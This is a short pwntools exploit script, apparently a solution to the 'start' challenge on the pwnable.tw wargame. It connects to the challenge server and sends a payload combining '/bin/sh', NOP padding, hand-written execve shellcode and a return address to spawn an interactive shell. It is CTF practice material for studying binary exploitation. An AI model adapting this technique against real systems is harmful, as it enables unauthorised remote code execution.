from pwn import *


elf = context.binary = ELF('start')




#nc chall.pwnable.tw 10000

p = remote('chall.pwnable.tw', 10000)
#p = process()
#gdb.attach(p, gdbscript='''
#b *0x804809c
#           c
#           nexti
#           x/20xw $esp''')

START = 0x8048060
ADD_ESP = 0x8048099
INT_0X80 = 0x0804808f
RET = 0x804809c

shellcode = shellcraft.sh()
payload = b'/bin/sh\x00'
payload += b'\x90'*4
payload += asm('''mov al, 0xb
                    xor edx, edx
               xchg ebx, ecx
               int 0x80''')
payload += p32(RET)
payload += b'\x6c'

p.sendafter(b'CTF', payload)


p.interactive()